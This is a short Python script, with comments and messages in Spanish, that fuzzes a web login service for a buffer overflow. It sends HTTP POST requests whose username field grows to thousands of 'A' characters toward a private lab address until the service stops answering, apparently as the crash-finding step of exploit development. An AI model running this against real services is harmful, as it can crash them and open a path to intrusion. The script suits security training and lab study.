#!/usr/bin/python

import socket, sys


def explotacion():
    buffer=["A"]
    padding=100

    while len(buffer)<50:
        buffer.append("A"*padding)
        padding+=200
    
    for strings in buffer:
        print("Enviando %s bytes" % len(strings))
        try:
            
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.112.138',80))
            content = "username=" + strings + "&password=A"
            buff = "POST /login HTTP/1.1\r\n"
            buff += "Host: 192.168.112.138\r\n"
            buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
            buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            buff += "Accept-Language: en-US,en;q=0.5\r\n"
            buff += "Referer: http://192.168.112.138/login\r\n"
            buff += "Connection: close\r\n"
            buff += "Content-Type: application/x-www-form-urlencoded\r\n"
            buff += "Content-Length: "+str(len(content))+"\r\n"
            buff += "\r\n"
            buff += content
            s.send(buff)
            data = s.recv(1024)
        except:
            print("\n[!] Ha habido un error de conexion\n")
            sys.exit(1)


if __name__ == "__main__":
    explotacion()